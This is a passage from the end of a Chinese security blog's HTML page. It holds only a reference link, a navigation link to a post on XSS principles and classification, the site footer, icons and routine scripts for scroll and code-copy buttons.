<a href="https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q">https://mp.weixin.qq.com/s/Z6sVuMrYMZV8WD6z1-U95Q</a></li>
</ul>
<hr></section>

  
  
  <div class="paginator">
    
    
    <a class="next" href="http://www.hzhsec.top/list/base_bug/xss/xss1/"><span>XSS跨站 — 原理、分类与闭合</span>
      <svg class="icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.77086 21.1546C11.0491 22.698 21.4339 21.7773 21.4339 16.3608V4.63375C21.4339 3.93962 21.3581 3.30535 21.1917 2.76787M3.77086 21.1546C1.9934 20.7777 0.973585 18.7264 1.08749 16.688C1.2668 13.479 1.15721 9.43135 1.00513 6.21507C0.87809 3.52811 3.12891 1.16316 5.51029 1.25008C9.76594 1.40542 15.377 1.20229 18.7912 1.00542C20.0864 0.930734 20.8406 1.63385 21.1917 2.76787M3.77086 21.1546C4.56586 21.4723 5.49168 21.7879 6.5 22.0658M21.1917 2.76787C23.1097 4.18217 23.13 12.4191 22.9004 16.3608C20.8478 24.0194 12.3061 23.6662 6.5 22.0658M21.1917 2.76787C21.7612 4.51192 22.7203 9.67216 22 16.3608C21.2797 23.0494 11.3665 22.9511 6.5 22.0658M12.055 9C12.711 9.61644 14.3679 10.997 15.9519 11.7966C16.0174 11.8297 16.0154 11.9753 15.9494 12.0063C14.945 12.4779 13.0706 13.9264 12.055 15M15.5556 11.9667C13.1345 12.0608 8 12 6 11" stroke="currentColor" stroke-linecap="round"/>
      </svg>
    </a>
    
  </div>
  

  


</article>

        </div><footer class="footer">
  <p>&copy; 2025 <a href="http://www.hzhsec.top/">Hzhsec home</a>
    Powered by
    <a href="https://gohugo.io/" rel="noopener" target="_blank">Hugo️️</a>
    <a href="https://github.com/guangzhengli/hugo-theme-ladder" rel="noopener" target="_blank">Ladder</a>
️  </p>
</footer>

<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
        <path d="M10.5376 22.7916C11.0152 22.7207 22.5795 21.1781 22.0978 10.4211C22.0536 9.43274 21.9303 8.53367 21.7387 7.71865M10.5376 22.7916C16.876 22.3728 20.0969 19.8899 21.5383 16.9142M10.5376 22.7916C9.7707 22.9055 8.97982 22.8964 8.19743 22.7725M21.7387 7.71865C21.4988 6.69828 21.1518 5.80967 20.7188 5.04257M21.7387 7.71865C22.6022 10.1105 23.0542 13.7848 21.5383 16.9142M20.7188 5.04257C17.1684 -1.24629 7.83127 0.632493 4.27577 5.04257C2.88063 6.77451 -0.0433281 11.1668 1.38159 16.6571C2.27481 20.0988 5.17269 22.2936 8.19743 22.7725M20.7188 5.04257C22.0697 6.9404 24.0299 11.3848 22.3541 15.4153M21.5383 16.9142C21.8737 16.4251 22.1428 15.9235 22.3541 15.4153M8.19743 22.7725C12.1971 23.4683 20.6281 22.971 22.3541 15.4153M14 10.945C13.3836 10.289 12.003 8.63215 11.2034 7.04814C11.1703 6.98257 11.0247 6.98456 10.9937 7.05061C10.5221 8.05496 9.07362 9.92941 8 10.945M11.0333 7.44444C10.9392 9.86549 11 15 12 17" stroke="currentColor" stroke-linecap="round"/>
    </svg>
</a>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };
</script>

<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'Copy';

        function copyingDone() {
            copybutton.innerHTML = 'Copied';
            setTimeout(() => {
                copybutton.innerHTML = 'Copy';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });
        codeblock.parentNode.appendChild(copybutton);
    });
</script></main>
    </body>
  
  <script src="/main.min.6bb26b69159420159c74dc9e097b06a578ed2b68c701466a91a44a9632d851bd0af167a1b30012387b4c512b48ad9ad4d3394e04d77ae38d57e1920fe4ed34fe.js" integrity="sha512-a7JraRWUIBWcdNyeCXsGpXjtK2jHAUZqkaRKljLYUb0K8WehswASOHtMUStIrZrU0zlOBNd6441X4ZIP5O00/g==" crossorigin="anonymous" defer></script></html>
